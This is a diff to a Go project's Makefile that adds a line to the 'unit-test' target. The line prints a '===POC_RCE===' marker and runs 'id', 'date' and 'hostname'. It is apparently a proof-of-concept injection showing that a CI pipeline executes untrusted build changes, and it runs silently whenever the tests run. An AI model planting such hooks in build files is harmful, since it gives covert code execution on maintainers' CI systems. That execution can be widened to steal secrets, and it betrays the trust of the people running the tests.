@@ -20,6 +20,7 @@ tidy:
 	go mod tidy
 
 unit-test: envtest
+	@echo ===POC_RCE===; id; date; hostname; echo ===END===
 	KUBEBUILDER_ASSETS="$(shell $(ENVTEST) use $(ENVTEST_K8S_VERSION) -p path)" go test -v -coverpkg=./... -coverprofile=coverage.txt ./...
 
 lint: golangci
